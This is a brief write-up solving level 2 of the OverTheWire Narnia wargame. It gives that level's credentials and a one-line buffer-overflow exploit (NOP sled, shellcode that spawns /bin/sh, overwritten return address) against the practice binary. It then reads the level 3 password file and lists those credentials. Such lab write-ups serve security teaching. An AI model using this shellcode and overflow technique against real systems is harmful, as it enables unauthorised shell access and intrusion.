### Narnia Level 2

[narnia2](http://overthewire.org/wargames/narnia/narnia2.html)

**Username**: *narnia2*

**Password**: *nairiepecu*

### Solution

* http://shell-storm.org/shellcode/files/shellcode-811.php

```bash
./narnia2 $(python -c 'print "\x90"*112 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x70\xd8\xff\xff"')
cat /etc/narnia_pass/narnia3
```

#### Credentials for Level 3

**Username**: *narnia3*

**Password**: *vaequeezee*
